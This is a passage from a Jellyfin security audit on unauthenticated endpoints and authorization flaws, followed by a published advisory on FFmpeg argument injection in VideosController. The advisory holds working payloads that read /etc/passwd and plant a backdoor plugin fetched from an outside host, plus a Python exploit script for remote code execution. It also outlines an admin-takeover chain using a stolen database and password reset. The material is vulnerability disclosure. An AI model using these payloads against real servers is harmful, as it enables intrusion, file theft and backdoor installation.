  + Allows an attacker with knowledge of user id's (easily retrievable for authenticated users due to open /Users endpoint, see above) to get the entire user configuration for a given user, potentially containing sensitive or private information. Examples include the authentication provider, last login dates as well as bruteforce login information (login attempt counters).
  + Potential fix: Require user privileges on this endpoint. Better would be to only allow users to retrieve their own data, only admins should have the ability to see all users. See below for issues relating to per-user authentication.
* ~~GetUserViews() & GetGroupingOptions() (UserViewsController) endpoints are unauthenticated~~ [Update: Resolved in 10.8b1]
  + Allows anyone with knowledge of a user id to retrieve potentially user-personalized data of a user, without being authenticated as this user (also works without having an account on the server). Potentially leaks personal data of users.
  + Potential fix: Require user authentication (ideally specific per-user authentication) for these endpoints.
* GetAttachment() (VideoAttachmentsController) endpoint is unauthenticated
  + Allows anyone with knowdlege of a video id to retrieve any attachments, without requiring valid credentials
  + Potential fix: Require authentication on this endpoint
* GetSystemInfo() (SystemController) is unauthenticated
  + Leaks internal information about the server
  + Potential fix: Only allow during first time setup, then require admin access
* Branding/Splashscreen API endpoint (ImageController) is unauthenticated [New in 10.8]
  + Returns an image auto-generated from available media on the server. As this image is publicy available, this partially leaks metadata about media available on the server.
  + Potential fix: Require authentication on this endpoint (may be difficult without auth rewrite, see other image issues above)

1 except HlsSegmentController because the m3u playlist generated doesn't contain parameters

## Authentication and user ids are decoupled

This is basically a single issue, however because it affects at least 27 controllers (+ many more endpoints) I'm listing this an issue category. This issue is related to [#5210](https://github.com/jellyfin/jellyfin/issues/5210). Quoting my statements from that issue:

> As soon as you know a user's id, you do really get some data. If you modify your local storage to use an admin's user id, the UI starts showing the admin dashboard and the admin user's data (continue watching, favorites etc), but you cannot perform any admin-only API calls there as your session is still not privileged.
>
> You can still mess with the others user data - you can for example list or modify their favorites, recently watched, their progress on movies and series, see what they watched and so on, but you do not gain admin access. You basically get access to other users data, without gaining their privileges.
>
> It's a bit of a weakness of the Jellyfin API, that simply having a user's id + having some authentication token (from any other user) exposes much of the data of the other user. Most of the API simply takes the user id as a parameter, without checking if the current session is allowed to view data of that user.

Explanation: Because the API isn't checking whether the session authorization matches the id of the requested user, any authenticated user can edit every other user. This includes, but is not limited to, viewing & modifying favorites, watch progress, customizations, profile settings (except passwords), views and many more. The API only performs this check when attempting to perform actions such as changing a password: Then a function "assertCanUpdateUser()" from RequestHelpers is called to ensure that the session auth is valid to modify the password. Such a check, which binds auth information to the user id, should be present (almost) everywhere to ensure that users do not modify other users data. Exceptions could be made to admin users, but normal users should not be able to view or edit other users.

The only requirement for this is knowledge of a user id, which is currently trivially easy due to loose permissions on the /Users endpoint.

## Issues related to how authentication is handled

### Authentication information in HTTP URL's - the `api_key` parameter

Related: [#3492](https://github.com/jellyfin/jellyfin/issues/3492)

The jellyfin API currently accepts authentication either via a custom header, `X-Emby-Authorization` (or similar) or via a get parameter, `api_key`, which is used sometimes by the web client. The latter is problematic because having secrets in a URL is generally not a great idea. A user who copies a URL maybe isn't aware that the URL contains secrets. Especially stream URLs are very long, because they contain many parameters and so the api\_key parameter is easily overlooked. A user who carelessly shares such URL exposes their credentials to the world.

In addition, server admins who run jellyfin behind some type of (reverse) proxy almost always make some type of request logging. Request logging almost always includes the entire request url. This exposes the secret parameter to a logfile, making the logfile itself a precious secret. This is dangerous, as even too wide permissions on a single logfile can expose session credentials. On most webservers it is possible to censor such parameters before writing to a logfile, but this isn't currently explained or mentioned anywhere in the Jellyfin docs. (I do plan to make such a PR later to the docs page, if I don't forget it). Update: [The PR](https://github.com/jellyfin/jellyfin-docs/pull/522) is now live.

This issue - secrets in URLs - is long known to web developers. Sometimes it can't be avoided, but I believe the best way going forward would be to get rid of api\_key parameters in URLs. It prevents many dragons lurking around.

### Authentication information is stored in browsers local storage

Another rather big topic, with potential for controversy. Currently client authentication is handled by Javascript reading secrets from the browsers local storage and sending this via a custom HTTP header (or sometimes crafting URLs with an api\_key parameter).

This is bad design, because a single XSS issue is enough to read out the local storage, extracting user credentials (session auth tokens), thus hijacking a user's entire session with a Jellyfin server.

Many people don't like Cookies, I know, but until we have something better (like HTTP state tokens or so) Cookies are the best way to handle this going forward. Authentication data should be stored in a HTTP Cookie with Secure, HttpOnly and SameSite=Lax/Strict attributes set. A HttpOnly cookie prevents JavaScript from accessing user credentials, even if an attacker has JavaScript access due to an XSS issue. Right now, Jellyfin has some CSRF protection because on cross site requests no authentication data is send. SameSite attributes produce similar effects, hopefully preventing CSRF issues.

This would also mean that the browser now includes authentication information on every request, thus making changes to authentication (see "Unauthenticated endpoints" above) much easier.

# Argument Injection in FFmpeg codec parameters

High

[joshuaboniface](/joshuaboniface)
published
GHSA-866x-wj5j-2vf4
Dec 6, 2023

## Package

Jellyfin

## Affected versions

<=10.8.12

## Patched versions

10.8.13

## Description

## As reported by @FredericLinn...

An argument injection [1](#user-content-fn-0-b91013d5923e6cbebf5d092274785809) in the VideosController, specifically the `/Videos/<itemId>/stream` and `/Videos/<itemId>/stream.<container>` endpoints is present in the current Jellyfin version. Additional endpoints in the AudioController might also be vulnerable, as they differ only slightly in execution.

Those endpoints are reachable by an unauthenticated user, which is already known [2](#user-content-fn-1-b91013d5923e6cbebf5d092274785809).

### Impact

First of all: An unauthenticated attacker has to guess any itemId, which are completely random GUIDs. It’s a very unlikely case even for a large media database with lots of items. Without an additional information leak, this vulnerability shouldn’t be directly exploitable, even if the instance is reachable from the Internet.

There are a lot of query parameters that get accepted by the method. At least two of those, videoCodec and audioCodec are vulnerable to the argument injection. The values can be traced through a lot of code and might be changed in the process. However, the fallback is to always use them as-is, which means we can inject our own arguments.

Those arguments land in the command line of FFmpeg.

Because UseShellExecute is always set to false, we can’t simply terminate the FFmpeg command and execute our own. It should only be possible to add additional arguments to FFmpeg, which is powerful enough as it stands. I’ve verified three possible exploitation vectors:

1. overwriting arbitrary files with a zero byte file by specifying and additional output
2. including text files into the final video via the draw text filter [3](#user-content-fn-2-b91013d5923e6cbebf5d092274785809)
3. including any file as an attachment to the final video

There is probably a way of overwriting an arbitrary file with malicious content. FFmpeg can retrieve output via numerous protocols, after all. Maybe those protocols can even be used to gather NTLM hashes [4](#user-content-fn-3-b91013d5923e6cbebf5d092274785809). That’s only speculation, though!

Things we could do with the arbitrary file read while only using Jellythings:

* reset a user’s password (needs the username) and include the password reset file via the second vector from above, as we get the full path to the file in the resetting process
* include the whole Jellyfin database and look for API keys or Easy-Access-Codes to gain access

The first case should only be possible from within the local network, but I don’t know how a reverse proxy would change things.

It doesn’t really matter, because the file inclusion through stream attachments is a lot more powerful, anyway.

The passwords in the database are hashed, but the Easy-Access-Codes are plain text. Furthermore, Resetting a user’s password sets an Easy-Access-Code for that account, even if not specified before.

With that, an attacker could include the database, look for a user with admin privileges, reset their password via the reachable login page and include the database again the get the access code.

Again, I’m not completely sure about the local network aspect in the password reset process.

In the case of managing to gain admin privileges, the technique of replacing the media encoder with a malicious log file still applies in order to gain remote code execution.

While this is technically an unauthenticated arbitrary file inclusion, in reality it’s a lot more nuanced. Requiring a valid GUID makes unauthenticated exploitation highly unlikely, if not impossible.

As it stands, the vulnerability is dangerous in the hands of a low-privileged user who has access to itemIDs and usernames already, especially given the implementation of the password reset functionality.

## As reported by [@mawalu](https://github.com/mawalu)

The call to ffmpeg in `VideosController` is vulnerable to argument injection. This injection can be leveraged to read and write arbitrary files on the jellyfin host. Combined with the plugin system and a restart of jellyfin it is also possible to gain remote code execution.

### Overview

The `VideoCodec` parameter of the `VideosController#GetVideoStreamByContainer` controller gets passed to ffmpeg without any validation. Since all ffmpeg arguments are passed as a single string it is possible to add additional arguments.

Arbitrary read & write of files can be achieved using the `-attach` and `-dump_attachment:t` flags of ffmpeg and mkv containers.

The vulnerability requires the attack to know a media id as a result it can't be exploited by an unauthenticated attacker.

### Possible fixes

Pass arguments to the new process as an array and not as a string. This way the injection of new arguments would no longer be possible. I'm not very experienced with c# but it looks like `ProcessStartInfo.ArgumentList` attribute seems to be relevant here.

### Example payload

Read file:

```
/Videos/{media}/stream.mkv?VideoCodec=libx264 -attach /etc/passwd
-metadata:s:1 mimetype=application/octet-stream

```

Extract using `ffmpeg -dump_attachment:t downloaded_file.mkv`

Write file:

```
/Videos/{media}/stream.mkv?VideoCodec=libx264 /tmp/a.mkv
-dump_attachment:t
/config/plugins/configurations/Jellyfin.Plugin.Backdoor.dll -i
https://mawalabs.de/stuff/backdoor.mkv

```

The attachment of the hosted mkv file will be extracted to the plugin dir in this example.

### Exploit example

```
import requests
import time
#import yt_dlp

remote = 'http://localhost:8096/'
media = '8370335ee130690a60a26e56e39009af'
lport = 1337
base = 'https://mawalabs.de/stuff' # location of the backdoor.mkv

def encode(p):
     return p.replace(' ', '%20')

def download(remote, media, file):
     payload = encode(f"libx264 -attach {file} -metadata:s:1
mimetype=application/octet-stream")

     # downloading the mkv container with curl / request fails. quickfix
using ytdl
     #with yt_dlp.YoutubeDL() as ydl:
     #
ydl.download(f"{remote}/Videos/{media}/stream.mkv?VideoCodec={payload}")

def upload(remote, media, file, base):
     payload = encode(f"libx264 /tmp/a.mkv -dump_attachment:t {file} -i
{base}/backdoor.mkv")

requests.get(f"{remote}/Videos/{media}/stream.mkv?VideoCodec={payload}")

def main():
     # print("leaking file")
     # download(remote, media, '/etc/passwd')

     print("uploading backdoor")
     upload(remote, media,
'/config/plugins/configurations/Jellyfin.Plugin.Backdoor.dll', base)

     print("plz restart, waiting...")
     time.sleep(20)

     print("leaking filesystem")
     print(requests.get(f"{remote}/api/pwn/ls").text)

main()
```
